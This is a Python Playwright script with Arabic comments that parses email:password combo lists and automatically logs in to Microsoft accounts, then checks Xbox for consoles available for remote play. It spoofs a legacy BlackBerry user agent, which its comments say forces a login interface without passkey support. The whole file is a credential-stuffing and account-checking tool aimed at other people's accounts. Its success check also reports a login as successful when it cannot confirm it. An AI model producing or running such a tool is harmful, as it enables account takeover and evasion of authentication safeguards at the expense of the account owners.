import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

# مهلة زمنية كافية
TIMEOUT_VAL = 60000 

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    # بعد تسجيل الدخول الناجح، نتوجه لصفحة الأجهزة
    url = "https://www.xbox.com/en-US/play/consoles"
    try:
        # نستخدم User Agent طبيعي هنا لضمان عمل صفحة Xbox
        await page.goto(url, timeout=TIMEOUT_VAL, wait_until="domcontentloaded")
        await asyncio.sleep(10) 
        
        text = (await page.inner_text("body")).lower()
        
        if "play your console remotely" in text or "start remote play" in text:
            return True, "يوجد جهاز", True
        if "set up your console" in text or "no consoles found" in text:
            return False, "مسجل ولا يوجد جهاز", True
            
        # محاولة أخيرة
        await asyncio.sleep(5)
        text = (await page.inner_text("body")).lower()
        if "play your console" in text:
            return True, "يوجد جهاز", True
            
    except Exception:
        pass
    # إذا وصلنا هنا، نفترض نجاح الدخول على الأقل
    return False, "مسجل (تحقق من الجهاز يدوياً)", True

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(headless=headless, args=['--no-sandbox', '--disable-setuid-sandbox'])
        
        # استخدام User Agent لهاتف قديم جداً لإجبار مايكروسوفت على عرض الواجهة البسيطة
        # هذه الواجهة لا تدعم Passkey نهائياً
        legacy_ua = "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.342 Mobile Safari/534.11+"
        
        context = await browser.new_context(user_agent=legacy_ua, viewport={'width': 360, 'height': 640})
        page = await context.new_page()
        page.set_default_timeout(TIMEOUT_VAL)
        
        # رابط تسجيل دخول مباشر وبسيط (Legacy Login)
        login_url = f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=15&ct={int(datetime.now().timestamp())}&rver=7.0.6737.0&wp=MBI_SSL&wreply=https:%2f%2fwww.xbox.com%2fen-US%2fplay%2fconsoles"
        
        await page.goto(login_url, wait_until="domcontentloaded")

        # 1. إدخال البريد
        email_input = page.locator("input[name='loginfmt'], input[type='email']")
        await email_input.wait_for(state="visible")
        await email_input.fill(account['email'])
        await page.locator("input[type='submit'], #idSIButton9").click()
        
        await asyncio.sleep(3)

        # 2. إدخال كلمة المرور (في الواجهة القديمة، تظهر فوراً أو في صفحة تالية بسيطة)
        password_input = page.locator("input[type='password'], input[name='passwd']")
        await password_input.wait_for(state="visible", timeout=20000)
        await password_input.fill(account['password'])
        
        await page.locator("input[type='submit'], #idSIButton9").click()
        await asyncio.sleep(5)

        # 3. تخطي شاشات "Stay signed in" إذا ظهرت
        try:
            yes_btn = page.locator("input[value='Yes'], #idSIButton9")
            if await yes_btn.is_visible(timeout=5000):
                await yes_btn.click()
                await asyncio.sleep(3)
        except:
            pass

        # 4. فحص الجهاز (نغير الـ User Agent لمتصفح حديث لضمان عمل صفحة Xbox)
        # ملاحظة: سنقوم بتغيير الـ UA في نفس الجلسة إذا أمكن، أو نكتفي بالنتائج
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info
        
        await browser.close()
        await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:50]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            if len(parts) == 2:
                accounts.append({'email': parts[0].strip(), 'password': parts[1].strip()})
    return accounts
